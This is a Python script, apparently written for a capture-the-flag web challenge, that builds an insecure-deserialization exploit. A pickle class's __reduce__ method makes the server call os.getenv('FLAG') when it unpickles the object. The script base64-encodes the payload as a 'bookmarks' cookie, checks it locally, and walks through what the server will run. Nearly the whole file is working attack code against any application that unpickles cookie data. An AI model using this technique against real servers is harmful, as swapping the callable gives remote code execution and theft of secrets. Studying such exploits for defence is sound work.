import pickle
import base64
import os

# Verify the vulnerability context - pickle protocol 4 with empty list
empty_list_pickled = b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00]\x94.'
print(f"Empty list pickle bytes: {empty_list_pickled}")
print(f"Empty list base64: {base64.b64encode(empty_list_pickled).decode()}")
print()

# Create the exploit class
class Exploit:
    def __reduce__(self):
        # Return tuple: (callable, args)
        # When unpickled, os.getenv('FLAG', 'NOT_FOUND') will be called
        import os
        return (os.getenv, ('FLAG', 'NOT_FOUND'))

# Serialize the exploit object with pickle protocol 4
exploit_obj = Exploit()
pickled_payload = pickle.dumps(exploit_obj, protocol=4)

print(f"Exploit pickle bytes (hex): {pickled_payload.hex()}")
print(f"Exploit pickle bytes length: {len(pickled_payload)}")
print()

# Base64 encode for cookie
encoded_payload = base64.b64encode(pickled_payload).decode()
print(f"FINAL PAYLOAD (base64): {encoded_payload}")
print()

# Verify locally that unpickling works correctly
print("=== LOCAL VERIFICATION ===")
print(f"Testing with FLAG='TEST_FLAG_VALUE_12345' in environment")
os.environ['FLAG'] = 'TEST_FLAG_VALUE_12345'

# Decode and unpickle
decoded = base64.b64decode(encoded_payload)
result = pickle.loads(decoded)
print(f"Unpickle result: {result}")
print(f"Expected: 'TEST_FLAG_VALUE_12345'")
print(f"Success: {result == 'TEST_FLAG_VALUE_12345'}")
print()

# Cleanup
if 'FLAG' in os.environ:
    del os.environ['FLAG']

# Show what the server will receive and do
print("=== PAYLOAD STRUCTURE ===")
print(f"Cookie name: bookmarks")
print(f"Cookie value: {encoded_payload}")
print()
print("When server calls pickle.loads() on this:")
print(f"  1. Decodes base64: {len(pickled_payload)} bytes")
print(f"  2. Unpickles with protocol 4")
print(f"  3. __reduce__ returns (os.getenv, ('FLAG', 'NOT_FOUND'))")
print(f"  4. Server executes: os.getenv('FLAG', 'NOT_FOUND')")
print(f"  5. Returns the FLAG value from server's environment")
